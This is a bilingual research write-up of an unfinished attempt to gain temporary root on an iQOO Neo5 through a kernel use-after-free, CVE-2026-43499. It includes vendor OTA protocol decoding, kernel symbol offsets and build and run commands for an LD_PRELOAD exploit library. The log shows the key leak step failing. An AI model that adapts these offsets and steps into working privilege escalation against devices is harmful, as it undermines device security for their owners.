# iQOO Neo5 (PD2055) 临时 Root 研究全记录 — CVE-2026-43499 完整实战
# iQOO Neo5 (PD2055) Temporary Root via CVE-2026-43499 — Full Write-up

> **Author**: Viper-Boss (AI 辅助: DeepSeek Harness)
> **Date**: 2026-11-08 ~ 2026-11-09
> **Device**: iQOO Neo5 (V2055A / PD2055) · 骁龙870 (Snapdragon 870) · Android 14 · OriginOS 4
> **Firmware**: PD2055_A_9.10.3 (kernel 4.19.152-perf+)
> **Status**: 🟡 exploit 可编译运行，futex 碰撞已确认，mm_struct 扫描被阻塞（哈希不匹配）

---

## 1. 我为什么要做这件事 / Why I'm doing this

我的 iQOO Neo5 的 Bootloader 锁死，**没有任何解锁路径**：
- `fastboot flashing unlock` → `unknown command`（vivo 从引导加载程序中删除了解锁命令）
- `fastboot oem unlock` → `unknown command`
- vivo 官方 BL 解锁通道多年前就已停止服务
- 该设备没有公开的签名 firehose（EDL/9008 模式无法使用）

我想要不解锁 BL 就获得临时 root，于是找到了 CVE-2026-43499 漏洞（GhostLock exploit）。这篇文章记录了我的完整旅程——包括所有死胡同——希望大家不用再浪费时间重复踩坑。

---

## 2. 总结 — 哪些可行、哪些不可行 / TL;DR

| 步骤 | 状态 | 说明 |
|------|------|------|
| CVE-2026-43499 futex UAF 触发 | ✅ 可用 | 每轮找到 3 个碰撞，设备稳定 |
| 固件获取（7GB 全量 OTA 包） | ✅ 可用 | 破解了 vivo 老版 OTA 协议 |
| 内核 kallsyms 提取（109,641 个符号） | ✅ 可用 | 自研解析器应对 vivo 修改过的 kallsyms 格式 |
| target.h 偏移表（24 个关键符号） | ✅ 可用 | init_task, selinux_state, kmalloc_caches 等 |
| NDK 编译 preload.so | ✅ 可用 | 编译通过，157KB |
| KernelSnitch mm_struct 暴力扫描 | ❌ 阻塞 | futex 哈希函数不匹配（详见 §8） |
| 最终 uid=0 提权 | ⏳ 待解决 | 需要修复哈希或改用其他方法 |

---

## 3. 设备指纹（通过 adb shell 验证）

```
ro.product.model=V2055A
ro.product.device=PD2055
ro.board.platform=kona
ro.soc.model=SM8250 (骁龙870)
ro.build.version.release=14
ro.build.display.id=PD2055_A_9.10.3
ro.build.version.incremental=compiler10161353
ro.build.version.security_patch=2025-09-01
ro.build.type=user / release-keys

# 内核
Linux version 4.19.152-perf+ (compiler@comdg01150025) (clang 10.0.5)
#1 SMP PREEMPT Thu Oct 16 14:02:35 CST 2025

# 启动链
androidboot.verifiedbootstate=green
androidboot.vbmeta.device_state=locked
androidboot.veritymode=enforcing
androidboot.securebootkeyver=4
androidboot.secureboot_enable=1
```

### 内核配置要点（来自 /proc/config.gz — 无需 root 即可读取！）

```
CONFIG_ARM64_VA_BITS=39, PGTABLE_LEVELS=3
CONFIG_PREEMPT=y, CONFIG_FUTEX_PI=y, CONFIG_RT_MUTEXES=y
CONFIG_KALLSYMS=y, CONFIG_KALLSYMS_ALL=y, CONFIG_IKHEADERS=y
CONFIG_SLAB_FREELIST_RANDOM=y, CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SLUB_MIRROR=y          # ← vivo 反利用加固
CONFIG_PANIC_ON_REFCOUNT_ERROR=y
CONFIG_PANIC_ON_OOPS 未设置 (PANIC_ON_OOPS_VALUE=0)
CONFIG_MODULE_SIG_FORCE=y (sha512)
CONFIG_STATIC_USERMODEHELPER=y → /system/bin/vivo_coredump
CONFIG_RANDOMIZE_BASE=y (KASLR)
```

---

## 4. 我先踩过的死胡同（免得你也踩）

### 4.1 官方 BL 解锁
- `fastboot flashing get_unlock_ability` 返回 `1`（有解锁能力位）
- 但 `fastboot flashing unlock` → `unknown command`
- vivo 把解锁命令从引导加载程序里完全删除了
- **结论：没有 vivo 内部工具就不可能解锁**

### 4.2 市面上所有"临时 root"工具（月虹/GhostLock/DirtyFrag 等）

我下载并静态分析了约 15 种不同工具。核心发现：

**iQOO 临时 root 生态是一个按机型门控的矩阵：**

| 工具 | 目标机型 | 内核 | 在 Neo5 上可用？ |
|------|---------|------|---------------|
| GhostLock 4.19 (K40 移植版) | 红米 K40 (alioth) | 4.19.157 GKI | ❌ 偏移不同 |
| 月虹提权助手 v1.6.4 | vivo 6.6 GKI 设备 | 6.6.30/57/89 | ❌ 无 vivo 4.19 payload |
| DirtyFrag / DirtyFlag | 5.15-6.12 GKI | 仅 GKI | ❌ 不支持 4.19 |
| KSuRoot | 多种 GKI | 5.10+ | ❌ 需要 init_boot 分区（Neo5 没有） |
| 其他所有工具 | ... | ... | ❌ |

**根本原因**：Neo5（2021年，SM8250）对 GKI 时代的 exploit 生态来说太老了。这些工具都瞄准 2024-2026 年搭载 5.10+ GKI 内核的旗舰设备。Neo5 的 4.19.152 非 GKI 内核从未被适配过。

### 4.3 Recovery 模式 adb
- `adb reboot recovery` 可以进入
- 但 recovery **没有 adbd**（vivo 锁死了）
- 在设备管理器中 USB 设备甚至不枚举
- **结论：无法从 recovery 用 dd 备份分区**

### 4.4 公开固件镜像站
- vivofirmware.com：只有 PD2055_A_1.10.16（2021 年原版）
- onfix.cn、gbfirmware.com、romzj.com.cn：全部止步于 6.x（2023 年）
- **没有任何公开镜像有 9.10.3**（最终 EOL 版本）
- vivo 官方客服确认："官网已取消下载升级包的网页路径"

---

## 5. 固件获取突破（最核心的部分）

这是最难的一步。完整链条如下：

### 5.1 技巧：利用 recovery 自带的联网更新

我重启进 recovery 模式，然后使用 recovery 菜单中的"联网更新"功能。这触发了 recovery：
1. 通过 `wget --post-data param=<混淆串>&jvq=1.0.3 https://sysupgrade.vivo.com.cn/api2` 查询 vivo OTA 服务器
2. 下载一个 7GB 的全量固件包
3. 安装（类型：REPAIR，因为 pre=post=PD2055D_A_9.10.3）

### 5.2 通过 bugreport 获取证据

```bash
adb bugreport
# 提取: FS/cache/recovery/last_log
```

recovery 日志包含：
- 完整的 wget 命令和加密的 `param` 值
- 下载的包路径：`/data/vivo-others/survival/vivo-survival_1.0-UpdateFull_package.zip`
- 安装确认：`INSTALL_SUCCESS`

### 5.3 破解 vivo 老版 OTA 协议（jvq 1.0.3）

这个"加密"实际上是**替换密码 + 标准的 ASCII 明文 base64 编码**——根本不是真正的加密。

**我的破解方法：**

1. **结构分析**：加密数据中所有重复子串的间距都 ≡ 0 (mod 4)，证明是 base64（重复子串只在 mod-4 边界处保持对齐）

2. **已知明文攻击**：请求中包含设备的 IMEI 哈希（`7495e...` — 来自 bugreport 中的 `last_ota_info`）、版本字符串 `PD2055D_A_9.10.3` 和 `PD2055MA`。这些为我提供了推导符号值的锚点。

3. **爬山算法 + oracle 验证**：用推导出的字母表重新编码解码后的明文，必须产生与原始密文完全一致的结果。这验证了答案的正确性。

4. **关键 bug 修复**：标准 base64 的第三个字节公式是 `b2 = ((v2&3)<<6)|v3`，**不是 `<<4`**！这个 bug 我调了几个小时，产生了微妙的错误结果。

**解密后的响应：**

```json
{
  "fileLength": "7039074100",
  "version": "9.10.3",
  "url": "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D1Wb74zZnMyZkEQMylyN9YS0gMdN46HMkYHYggQN4FiZ9USMPFQM8DyMwZSN8FSMz1XN90",
  ...
}
```

### 5.4 下载固件

```bash
curl --noproxy '*' -L -C - --retry 30 \
  -o PD2055_A_9.10.3_full.zip \
  "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D..."
# 7,039,074,100 字节，~110 MB/s 直连 vivo CDN
```

---

## 6. 内核 kallsyms 提取

固件包中的 boot.img 使用标准 v2 头：
```
kernel_size=50759696, page_size=4096, kernel_addr=0x8000
```

### 6.1 提取内核 Image

内核数据块从偏移 `page_size`（4096）开始，但在真正的 ARM64 Image 前面有一个 52 字节的 vivo 包装头：
```
[52 字节 vivo 头][ARM64 内核 Image (48.4MB)]
```

### 6.2 vivo 的反逆向工程修改

vivo 修改了内核以阻碍 kallsyms 提取：
1. **Image 头字段清零**：`text_offset=0, image_size=0, flags=0`（正常应该是 0x80000 等）
2. **kallsyms_markers 被移除**出标准位置
3. **自定义 markers 格式**：u32 值按 8 字节步距存储（而非标准的 u64/u32）

### 6.3 我自研的 kallsyms 解析器

由于 `vmlinux-to-elf` 等工具在 vivo 的修改上失败，我写了一个自定义解析器：

```
Token table:     0x2159ecc - 0x215a259 (256 个令牌，909 字节)
Token index:     0x215a2cc (256 × u16，验证 256/256)
Markers:         0x21590cc (429 个条目，u32 @ 8 字节步距)
Names:           0x1febb9b - 0x21590cc (1,495,175 字节，4.19 格式)
Offsets table:   0x1f805bc - 0x1feb7a8 (109,691 个条目 × s32)
```

**共提取 109,641 个符号**（约 50 个差异来自对齐填充）。

### 6.4 target.h 的关键符号

```
init_task (__start_init_task):  0x02926c40
init_uts_ns:                     0x02d9e688
empty_zero_page:                 0x030433d8
root_task_group:                 0x0306dbaa
selinux_state:                   0x024cdc60
security_hook_heads:             0x024cdc58
kmalloc_caches:                  0x024c4fec
anon_pipe_buf_ops:               0x01cf8de0
remove_waiter (漏洞函数!):        0x000d4198
ashmem_fops:                     0x01e6f680
configfs_read_file:              0x0033ae18
modprobe_path:                   0x02db28e8
panic:                           0x0003bbe8
printk:                          0x000dd888
```

---

## 7. 构建 exploit

我使用开源 [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40)（Apache-2.0，最初为红米 K40/骁龙870级 4.19 内核编写）作为基础。

```bash
# 在 WSL Ubuntu 26.04 中
export NDK_ROOT=~/android-ndk-r27c
CC=$NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang

# 构建 preload.so
$CC -O2 -g0 -Isrc -DTARGET_CONFIG_H="targets/pd2055-4.19.152-perf/target.h" \
    -fPIC -shared -o preload.so -pthread \
    src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c \
    src/preload.c src/su_blob.S src/wallpaper_blob.S
```

### 在设备上运行

```bash
adb push preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
```

### 运行结果（来自 fsync 日志）：

```
[+] preload starting pid=25073
[+] startup context uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1
[+] build config label=pd2055_4.19.152_perf_a14
[*] memory detected ram=0x300000000 (12 GB)
[*] futex_init hashsize=0x800 (cpus=8)
[*] found 3 collisions
[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8080000000]
...
[-] KernelSnitch mm_struct leak failed
[-] prepare_kernel_page retry 1/12
... (重试 12 次，全部失败)
```

**futex 碰撞检测正常工作**（CVE 触发是功能性的——我们可以通过时序检测哈希碰撞）。设备全程保持稳定（没有内核崩溃，感谢 `PANIC_ON_OOPS=0`）。

---

## 8. 当前阻塞点：KernelSnitch 中的 futex 哈希不匹配

经过深入的源码分析，我找到了根本原因：

### Linux 4.19 内核的 futex 哈希：

```c
// kernel/futex.c (4.19)
static struct futex_hash_bucket *futex_hash(union futex_key *key)
{
    u32 hash = jhash2((void *)&key->both.word,    // ← 从偏移 8 开始（address）
                      sizeof(key->both.word)/4,    // ← 2 个 u32（仅地址）
                      key->both.offset);           // ← 初始值 = 偏移
    return &futex_queues[hash & (futex_hashsize - 1)];
}
```

**内核只对用户空间地址（2 个 u32）做哈希。mm_struct 指针不参与哈希计算。**

### exploit 的 futex 哈希（来自 K40 移植版）：

```c
// futex_hash.h (exploit)
uint32_t futex_hash(size_t addr, size_t mm)
{
    futex_key_t key;
    key.private.mm = (void *)mm;           // ← 把 mm 也放进哈希了！
    key.private.address = addr & ~0xfff;
    key.private.offset = addr & 0xfff;
    return __futex_hash(&key, futex_hashsize);
}
// 内部: jhash2((u32*)key, 4, offset) → 哈希 mm + address（4 个 u32）
```

**exploit 哈希了 4 个 u32（mm + address），但内核只哈希 2 个 u32（仅地址）。**

这意味着暴力扫描 mm_struct 地址解决的是一个与内核使用的不同的方程——不管尝试多少个候选值都永远找不到正确答案。

### 修复方向：

1. **修复哈希函数**以匹配 4.19（2 个 u32）——但那样 mm 就不在哈希里了，暴力破解技术在数学上就无效了
2. **使用不同的 mm_struct 泄露技术**——例如基于 pipe 的物理内存读取原语，或其他侧信道
3. **完全跳过 KernelSnitch**，直接使用 configfs fops 劫持路径（这就是 K40 exploit 的 `CHEESE_BASE_HUNT=1` 模式的做法）

### 来自 slabinfo 的额外数据（设备特定）：

```
mm_struct: objsize=960 (0x3C0), 34 objects/slab, order 3
```

实际的 mm_struct 大小是 **960 字节**，不是我最初在 target.h 中设置的 0x340（832）。而且 vivo 加了原版 4.19 中不存在的 `kmalloc-rcl-*`（回收）缓存类型。

---

## 9. 本仓库的关键文件和工具

| 文件 | 说明 |
|------|------|
| `target.h` | PD2055 4.19.152-perf 的完整偏移表 |
| `kallsyms.txt` | 完整内核符号表（109,641 条目） |
| `target_offsets.txt` | target.h 的格式化偏移值 |
| `boot.img` (96MB) | 从固件包提取的内核镜像，供社区分析 |
| `xbl_config.elf` | XBL 配置（物理加载地址推导） |
| `exploit/` | 修改后的 GhostLock exploit 源码 |
| `scripts/` | 全部分析脚本（kallsyms 解析器、OTA 解密器等） |
| `tools/` | vivo_ota_decrypt.py — 独立的 OTA 协议解密工具 |
| `analysis/` | 解密后的 OTA 响应、字母表、slabinfo |
| `logs/` | 设备上的 exploit 执行日志 |

---

## 10. 复现步骤

```bash
# 1. 获取固件（需要 OTA 协议破解 — 见 scripts/）
# 2. 从 zip 中提取 boot.img
python3 -c "import zipfile; z=zipfile.ZipFile('PD2055_A_9.10.3_full.zip'); z.extract('boot.img')"

# 3. 解析内核 Image（见 scripts/parse_kallsyms.py）
# 4. 构建 exploit
cd exploit && bash build.sh

# 5. 在设备上运行
adb push build/pd2055-4.19.152-perf/bin/preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
```

---

## 11. 致谢和参考

- [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40) by yijiacloud (Apache-2.0)
- [CVE-2026-43499](https://nvd.nist.gov/vuln/detail/CVE-2026-43499) — rtmutex remove_waiter() UAF
- 上游: [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) (IonStack)
- [VIVO-OTA-Tracker](https://github.com/mytiantian001/VIVO-OTA-Tracker) — vivo OTA 查询工具（帮助理解协议）
- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) — 内核符号提取（部分可用）

## 12. 许可证 / License

本仓库使用 **GPLv3** 许可证。exploit 源码继承上游 Apache-2.0 许可证。

---

*本研究仅供教育目的。请仅在你自己拥有的硬件上使用。*
*This research is for educational purposes. Use only on hardware you own.*
